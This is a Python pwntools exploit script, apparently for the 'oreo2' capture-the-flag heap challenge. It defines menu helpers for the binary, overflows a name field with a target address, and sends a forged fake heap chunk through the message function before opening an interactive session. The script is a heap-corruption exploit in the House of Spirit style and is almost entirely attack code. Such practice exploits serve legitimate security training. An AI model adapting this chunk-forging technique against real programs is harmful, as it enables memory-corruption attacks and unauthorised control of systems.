# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

# r = remote('52.68.31.117', 9547)
r = process('./oreo2')

# libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
oreo = ELF("./oreo2")
print(str(r.proc.pid))

def add(name):
    # r.recvuntil('Action:')
    r.sendline('1')
    r.sendline(str(name)) #name
    r.sendline(str('ABCD')) # desc

def show():
    r.sendline('2')
    # res = r.recvuntil('Action:')
    # return res
    # res = r.recvuntil('OK\n')
    # print('fill content: ', res)

def order():
    r.sendline('3')
    # r.recvuntil('')

def msg(msg):
    r.sendline('4')
    r.sendline(str(msg))

def stats():
    r.sendline('5')


# r.recvuntil('Action: ')
r.recv()

target = 0x804b080 +0x8
# target = 0x804b070 +0x8


add('A'*20)
add('B'*27 + p32(target))
# add('B'*20)
# r.recv()
r.recv(timeout=0.01)

payload = ''
payload += p32(0x0)+p32(0x41)
payload += 13 * p32(0x42)  
payload += p32(0x0)  # prev gun 

payload += p32(0x0)  # 
payload += p32(0x41) # next chuck
msg(payload)







print(str(r.proc.pid))

r.interactive()


